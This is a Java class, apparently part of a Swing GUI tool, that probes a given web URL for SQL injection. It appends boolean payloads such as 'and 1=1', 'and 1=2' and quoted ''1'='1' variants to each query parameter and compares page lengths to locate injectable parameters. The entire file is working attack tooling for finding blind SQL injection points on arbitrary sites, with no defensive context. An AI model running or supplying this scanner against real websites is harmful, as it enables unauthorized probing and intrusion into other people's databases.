package com.sql;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

import javax.swing.JLabel;

public class IsExistInjection {
	private String url;
	public static JLabel processInform;
	public IsExistInjection(String url) {
		// TODO Auto-generated constructor stub
		this.url=url;
	}
	public static void giveLabel(JLabel process){
		processInform=process;
	}
	public boolean isExistVariable(){
		if(this.url.indexOf("?")!=-1)
			if(this.url.substring(this.url.indexOf("?"))!="")
				return true;
		return false;
	}
	
	
	public static boolean isSamePage(String urlStr1,String urlStr2){
		String content1="";//原页面长度	
		String content2="";//注入后页面长度
		content1=getContent(urlStr1);
		content2=getContent(urlStr2);
		processInform.setText(urlStr2.substring(urlStr2.indexOf("and")+3));
		if(urlStr1.indexOf("php?")>0){
			int length=urlStr2.substring(urlStr2.indexOf("%")).replaceAll("%[a-z0-9]{2}", " ").length();
			return Math.abs(content1.length()+length-content2.length())<3;
		}
		else
			return Math.abs(content1.length()-content2.length())<10;
	}
	public static boolean isRightPage(int len,String url){
		String content2=getContent(url);
		processInform.setText(url.substring(url.indexOf("and")+4));
		if(url.indexOf("php?")>0){
			int length=url.substring(url.indexOf("%")).replaceAll("%[a-z0-9]{2}", " ").length();
			return Math.abs(len+length-content2.length())<2;
		}
		else
			return Math.abs(len-content2.length())<10;
	}
	public static String getContent(String urlStr){
		String content="";//原页面长度	
		URL url;
		String s;
		try {
			url = new URL(urlStr);
			URLConnection urlConnection = url.openConnection();
			BufferedReader br=new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
			while((s=br.readLine())!=null){
				content=content+s;
			}
		} catch (MalformedURLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return content;
	}
	public boolean isExistNumberInjection(int index){
		String url_head;
		String url_end;
		url_head=this.url.substring(0,index);
		url_end=this.url.substring(index,this.url.length());
		String urlChanged=url_head+"%20and%201=1"+url_end;  //判断变量是否过滤
		if(isSamePage(this.url,urlChanged)){
			urlChanged=url_head+"%20and%201=2"+url_end;		//判断是否为注入点
			if(isSamePage(this.url,urlChanged))
				return false;
			else
				return true;
		}
		else
			return false;
	}
	public boolean IsExistCharInjection(int index){
		String url_head;
		String url_end;
		url_head=this.url.substring(0,index);
		url_end=this.url.substring(index,this.url.length());
		String urlChanged=url_head+"'%20and%20'1'='1"+url_end;
		if(isSamePage(this.url,urlChanged)){
			urlChanged=url_head+"'%20and%20'1'='2"+url_end;
			if(isSamePage(this.url,urlChanged))
				return false;
			else
				return true;
		}
		else
			return false;
	}
	
	
	public int locationOfNumberInjection(){                     //数值注入
		int index=this.url.indexOf("?");
		String sentence=this.url.substring(index);
		while(sentence.length()>0){//有and连接符
			if(sentence.indexOf("&")!=-1){
				index=index+sentence.indexOf("&");
				if(isExistNumberInjection(index))
					return index;
				sentence=this.url.substring(index+1);
				index++;
			}
			else{//无and连接符
				index=index+sentence.length();//直接到url末尾
				if(isExistNumberInjection(index))
					return index;
				sentence=this.url.substring(index);
			}
		}
		return -1;
	}
	public int locationOfCharInjection(){							//字符注入
		int index=this.url.indexOf("?");
		String sentence=this.url.substring(index);
		while(sentence.length()>0){
			if(sentence.indexOf("&")!=-1){
				index=index+sentence.indexOf("&");
				if(IsExistCharInjection(index))
					return index;
				sentence=this.url.substring(index+1);
				index++;
			}
			else{
				index=index+sentence.length();
				if(IsExistCharInjection(index))
					return index;
				sentence=this.url.substring(index);
			}
		}
		return -1;
	}
}

